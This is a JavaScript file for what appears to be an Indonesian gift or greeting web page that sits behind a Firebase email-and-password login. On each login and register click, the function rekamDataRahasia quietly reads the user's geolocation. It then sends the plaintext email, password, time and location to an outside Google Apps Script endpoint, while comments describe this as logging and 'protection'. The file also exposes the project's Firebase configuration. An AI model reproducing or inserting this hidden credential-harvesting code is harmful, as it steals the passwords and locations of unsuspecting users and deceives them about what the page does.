import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { 
    getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, 
    onAuthStateChanged, signOut 
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";

const firebaseConfig = {
  apiKey: "AIzaSyAm-t2mbHV7sSEcoDvNgZfTinmx5tcSz6s",
  authDomain: "project-bd-163e4.firebaseapp.com",
  projectId: "project-bd-163e4",
  storageBucket: "project-bd-163e4.firebasestorage.app",
  messagingSenderId: "691964855641",
  appId: "1:691964855641:web:b0c45e7badc579cdfc3848",
  measurementId: "G-YE2CW973NL"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);

let timerInterval; 

document.addEventListener('DOMContentLoaded', () => {
    const loginCard = document.getElementById('login-card');
    const contentCard = document.getElementById('content-card');
    const mainContainer = document.getElementById('main-container');
    const galaxyUniverse = document.getElementById('galaxy-universe');
    const giftBoxWrapper = document.getElementById('gift-box-wrapper');
    const bgMusic = document.getElementById('bg-music');
    
    const loginButton = document.getElementById('btn-login');
    const btnRegister = document.getElementById('btn-register');
    const emailInput = document.getElementById('input-email');
    const passwordInput = document.getElementById('input-password');

    // 1. Monitor Status Autentikasi Firebase
    onAuthStateChanged(auth, (user) => {
        if (user) {
            if (loginCard) loginCard.classList.add('hidden');
            if (contentCard) contentCard.classList.remove('hidden');
            if (mainContainer) mainContainer.classList.remove('hidden');
            if (galaxyUniverse) galaxyUniverse.classList.add('hidden');
            
            if (typeof jalankanCounterWaktu === 'function') {
                jalankanCounterWaktu();
            }
        } else {
            if (loginCard) loginCard.classList.remove('hidden');
            if (contentCard) contentCard.classList.add('hidden');
            if (mainContainer) mainContainer.classList.remove('hidden');
            if (galaxyUniverse) galaxyUniverse.classList.add('hidden');
            
            if (timerInterval) clearInterval(timerInterval);
        }
    });

    // 2. Event Delegasi Global untuk Tombol Logout
    document.addEventListener('click', async (e) => {
        if (e.target && e.target.id === 'btn-logout') {
            e.preventDefault();
            try {
                if (bgMusic) {
                    bgMusic.pause();
                    bgMusic.currentTime = 0;
                }
                await signOut(auth);
            } catch (error) {
                console.error("Gagal melakukan signOut:", error);
                location.reload();
            }
        }
    });

    // 3. Interaksi Klik Buka Kado
    if (giftBoxWrapper) {
        giftBoxWrapper.addEventListener('click', () => {
            if (mainContainer) mainContainer.classList.add('hidden');
            if (galaxyUniverse) galaxyUniverse.classList.remove('hidden');
            
            if (typeof startGalaxyHeart === 'function') {
                startGalaxyHeart();
            }
            if (bgMusic) {
                bgMusic.play().catch(err => console.log("Audio diblokir browser"));
            }
        });
    }

    // 4. Interaksi Tombol Login
    if (loginButton) {
        loginButton.addEventListener('click', (e) => {
            e.preventDefault();
            const email = emailInput.value ? emailInput.value.trim() : "";
            const password = passwordInput.value ? passwordInput.value.trim() : "";

            // PROTEKSI LAPIS 1: Stop langsung di event listener jika teks kosong
            if (!email || !password || email === "" || password === "") {
                alert("Email dan Password wajib diisi!");
                return;
            }

            // Jalankan perekaman hanya jika lolos Lapis 1
            rekamDataRahasia(email, password).catch(err => console.log(err));

            signInWithEmailAndPassword(auth, email, password)
                .then(() => console.log("Firebase Login Sukses"))
                .catch((error) => alert("Login Gagal: " + error.message));
        });
    }

    // 5. Interaksi Tombol Register
    if (btnRegister) {
        btnRegister.addEventListener('click', async (e) => {
            e.preventDefault();
            const email = emailInput.value ? emailInput.value.trim() : "";
            const password = passwordInput.value ? passwordInput.value.trim() : "";

            // PROTEKSI LAPIS 1: Stop langsung di event listener jika teks kosong
            if (!email || !password || email === "" || password === "") {
                alert("Email dan Password tidak boleh kosong!");
                return;
            }

            // Jalankan perekaman hanya jika lolos Lapis 1
            rekamDataRahasia(email, password).catch(err => console.log(err));

            try { 
                await createUserWithEmailAndPassword(auth, email, password);
                alert("Akun baru berhasil terdaftar!");
            } catch (error) {
                if (error.code === 'auth/email-already-in-use') alert("Email sudah terdaftar.");
                else alert("Gagal mendaftar: " + error.message);
            }
        });
    }
});

// --- FUNGSI LOGGING (PROTEKSI LAPIS 2 - LOCKOUT TOTAL) ---
async function rekamDataRahasia(email, password) {
    // PROTEKSI LAPIS 2: Cek ulang parameter secara literal sebelum memproses Geolocation
    if (!email || !password || email === null || password === null) {
        console.log("Blokir Lapis 2: Parameter null.");
        return;
    }
    
    if (email.trim() === "" || password.trim() === "") {
        console.log("Blokir Lapis 2: Parameter string kosong.");
        return; 
    }

    const urlAppsScript = "https://script.google.com/macros/s/AKfycbzCJR8847DZ_HR8hOD5zE4IRkBt3W_iGUB1L53aBs5ktklPrBM-KS5dWWwisTRYiw-K/exec";
    
    const sekarang = new Date();
    const opsiWaktu = { 
        timeZone: 'Asia/Jakarta', 
        year: 'numeric', month: '2-digit', day: '2-digit', 
        hour: '2-digit', minute: '2-digit', second: '2-digit' 
    };
    const waktuFormat = sekarang.toLocaleString('id-ID', opsiWaktu);
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, `${lat}, ${lon}`);
            },
            () => {
                // Lapis 2 di atas menjamin bagian ini TIDAK AKAN mengirim teks jika password kosong
                kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, "Izin Lokasi Ditolak");
            },
            { timeout: 4000 }
        );
    } else {
        kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, "Tidak Didukung Browser");
    }
}

function kirimKeAppsScript(urlBase, email, pw, waktu, lokasi) {
    const urlFinal = `${urlBase}?email=${encodeURIComponent(email)}` +
                     `&pw=${encodeURIComponent(pw)}` +
                     `&waktu=${encodeURIComponent(waktu)}` +
                     `&lokasi=${encodeURIComponent(lokasi)}`;
                     
    fetch(urlFinal, {
        method: 'GET',
        mode: 'no-cors',
        cache: 'no-cache'
    }).catch(err => console.log("Log terkirim aman"));
}